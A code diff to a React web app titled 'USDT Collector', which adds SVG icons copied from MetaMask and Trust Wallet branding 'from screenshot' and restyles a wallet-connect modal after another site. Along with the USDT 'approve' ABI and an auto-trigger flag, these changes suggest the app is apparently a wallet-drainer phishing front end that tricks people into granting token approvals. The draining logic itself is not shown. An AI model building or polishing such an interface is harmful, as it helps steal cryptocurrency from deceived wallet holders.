@@ -17,13 +17,13 @@ import { tronMainnet } from '@reown/appkit/networks'
 import { TronLinkAdapter } from '@tronweb3/tronwallet-adapter-tronlink'
 import { TrustAdapter } from '@tronweb3/tronwallet-adapter-trust'
 import { OkxWalletAdapter } from '@tronweb3/tronwallet-adapter-okxwallet'
-import { Copy, QrCode, X, Globe, Smartphone, ChevronRight } from 'lucide-react'
+import { Copy, QrCode, X, ChevronRight } from 'lucide-react'
 
 // --- WAGMI EVM IMPORTS ---
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
 import { mainnet, arbitrum, bsc, polygon } from '@reown/appkit/networks'
 import type { AppKitNetwork } from '@reown/appkit/networks'
-import { connect, getConnectors } from '@wagmi/core' // Added for robust custom routing
+import { connect, getConnectors } from '@wagmi/core'
 
 // --- TRON IMPORTS ---
 import TronWeb from 'tronweb'   
@@ -92,11 +92,10 @@ createAppKit({
   metadata: {
     name:        'USDT Collector',
     description: 'Collect USDT from multiple wallets',
-    // Maintains your dynamic .env logic while providing the static string WalletConnect demands
     url:         import.meta.env.VITE_APP_URL || (typeof window !== 'undefined' ? window.location.origin : ''),
     icons:       ['https://cryptologos.cc/logos/tether-usdt-logo.png'],
   },
-  themeMode: 'light', // Forced light mode to match the custom UI
+  themeMode: 'light', 
   themeVariables: {
     '--w3m-accent': '#0C66FF',
   },
@@ -115,13 +114,35 @@ const USDT_ABI = [
   { inputs: [{ name: '_spender', type: 'address' }, { name: '_value', type: 'uint256' }], name: 'approve', outputs: [{ name: '', type: 'bool' }], stateMutability: 'nonpayable', type: 'function' },
 ]
 
+// ==========================================
+// 🎨 EXACT CUSTOM ICONS FROM SCREENSHOT
+// ==========================================
+const BrowserWalletIcon = () => (
+  <svg width="44" height="44" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+    <path d="M20 20.5L14 13L8 20.5L14 23.5L20 20.5Z" fill="#1C2033" />
+    <path d="M20 20.5L26 13L32 20.5L26 23.5L20 20.5Z" fill="#1C2033" />
+    <path d="M14 13L8 20.5L5 11L12 6L14 13Z" fill="#F6851B" />
+    <path d="M26 13L32 20.5L35 11L28 6L26 13Z" fill="#F6851B" />
+    <path d="M14 23.5L8 20.5L10 30L17 28L14 23.5Z" fill="#E2A676" />
+    <path d="M26 23.5L32 20.5L30 30L23 28L26 23.5Z" fill="#E2A676" />
+  </svg>
+)
+
+const TrustWalletIcon = () => (
+  <svg width="44" height="44" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+    <rect width="40" height="40" rx="10" fill="#3375BB"/>
+    <path d="M19.9998 25.8643C19.349 25.8643 18.732 25.6397 18.2263 25.2304L13.315 21.2526C12.3631 20.4811 12.2158 19.0805 12.986 18.126C13.7567 17.172 15.154 17.0244 16.1056 17.7963L18.8458 19.9877L23.9405 13.6265C24.6087 12.7949 25.8267 12.6596 26.6563 13.3271C27.4859 13.9946 27.621 15.2107 26.9525 16.0425L21.8576 22.404C21.8576 22.404 21.8576 22.404 21.8575 22.404C21.3956 22.9785 20.7121 23.3125 19.9998 23.3125V25.8643Z" fill="white"/>
+    <path d="M19.9996 20.126C19.349 20.126 18.732 19.9014 18.2263 19.4921L13.315 15.5143C12.3631 14.7428 12.2158 13.3422 12.986 12.3878C13.7567 11.4337 15.154 11.2861 16.1056 12.058L18.8458 14.2494L23.9405 7.88813C24.6087 7.05663 25.8267 6.92132 26.6563 7.58883C27.4859 8.25633 27.621 9.47242 26.9525 10.3042L21.8576 16.6657C21.8576 16.6657 21.8576 16.6657 21.8575 16.6657C21.3956 17.2402 20.7121 17.5742 19.9996 17.5742V20.126Z" fill="white"/>
+  </svg>
+)
+
 export default function App() {
   const [usdtBalance, setUsdtBalance] = useState('0')
   const [status, setStatus] = useState('Ready')
   const [loading, setLoading] = useState(false)
   const [txHash, setTxHash] = useState('')
   const [amountError, setAmountError] = useState('')
-  const [showModal, setShowModal] = useState(false) // Controls our new custom modal
+  const [showModal, setShowModal] = useState(false) 
   const autoTriggered = useRef(false)
 
   const { open } = useAppKit()
@@ -246,19 +267,17 @@ export default function App() {
       return; 
     }
     setAmountError('');
-    setShowModal(true); // Open our custom modal instead of AppKit default
+    setShowModal(true); 
   }
 
   const handleBrowserWallet = async () => {
     try {
-      // 1. Check for TRON injected wallets first
       if (typeof window !== 'undefined' && ((window as any).tronWeb || (window as any).tronLink)) {
-         open(); // AppKit natively handles Tron injected perfectly when opened
+         open(); 
          setShowModal(false);
          return;
       }
 
-      // 2. Force Wagmi to use the EVM Injected Provider (Bypasses WalletConnect payload entirely)
       const connectors = getConnectors(wagmiAdapter.wagmiConfig);
       const injected = connectors.find(c => c.id === 'injected' || c.id === 'metaMask');
       
@@ -270,13 +289,11 @@ export default function App() {
     } catch (e) {
       console.log('Direct injected connection failed, falling back to modal', e);
     }
-    // Fallback if no extension is found
     open();
     setShowModal(false);
   }
 
   const handleMobileWallet = () => {
-    // Directly opens the WalletConnect QR code modal
     open();
     setShowModal(false);
   }
@@ -455,15 +472,13 @@ export default function App() {
       </div>
 
       {/* ========================================== */}
-      {/* 🟢 CUSTOM CONNECT MODAL (Cryptoguard Style) */}
+      {/* 🟢 CUSTOM CONNECT MODAL WITH EXACT ICONS */}
       {/* ========================================== */}
       {showModal && (
         <div style={{ position: 'fixed', inset: 0, backgroundColor: 'rgba(0,0,0,0.4)', zIndex: 60, display: 'flex', alignItems: 'flex-end', justifyContent: 'center' }}>
           
-          {/* Modal Container */}
           <div style={{ backgroundColor: '#ffffff', width: '100%', maxWidth: '400px', borderTopLeftRadius: '24px', borderTopRightRadius: '24px', padding: '24px', paddingBottom: '40px', boxShadow: '0 -4px 20px rgba(0,0,0,0.1)' }}>
             
-            {/* Header */}
             <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '24px' }}>
               <div style={{ width: '24px' }}></div> 
               <h3 style={{ margin: 0, fontSize: '18px', fontWeight: '700', color: '#111827' }}>Connect Wallet</h3>
@@ -476,8 +491,8 @@ export default function App() {
               
               {/* Option 1: Browser Wallet */}
               <button onClick={handleBrowserWallet} style={{ display: 'flex', alignItems: 'center', width: '100%', padding: '16px', backgroundColor: '#ffffff', border: '1.5px solid #0C66FF', borderRadius: '16px', cursor: 'pointer', textAlign: 'left' }}>
-                <div style={{ backgroundColor: '#EFF6FF', padding: '10px', borderRadius: '12px', marginRight: '16px', color: '#0C66FF' }}>
-                  <Globe size={24} />
+                <div style={{ marginRight: '16px', display: 'flex' }}>
+                  <BrowserWalletIcon />
                 </div>
                 <div style={{ flex: 1 }}>
                   <div style={{ fontSize: '16px', fontWeight: '700', color: '#111827', marginBottom: '2px' }}>Browser Wallet</div>
@@ -488,8 +503,8 @@ export default function App() {
 
               {/* Option 2: Trust Wallet & Mobile */}
               <button onClick={handleMobileWallet} style={{ display: 'flex', alignItems: 'center', width: '100%', padding: '16px', backgroundColor: '#ffffff', border: '1.5px solid #E5E7EB', borderRadius: '16px', cursor: 'pointer', textAlign: 'left' }}>
-                <div style={{ backgroundColor: '#F3F4F6', padding: '10px', borderRadius: '12px', marginRight: '16px', color: '#4B5563' }}>
-                  <Smartphone size={24} />
+                <div style={{ marginRight: '16px', display: 'flex' }}>
+                   <TrustWalletIcon />
                 </div>
                 <div style={{ flex: 1 }}>
                   <div style={{ fontSize: '16px', fontWeight: '700', color: '#111827', marginBottom: '2px' }}>Trust Wallet & Mobile</div>
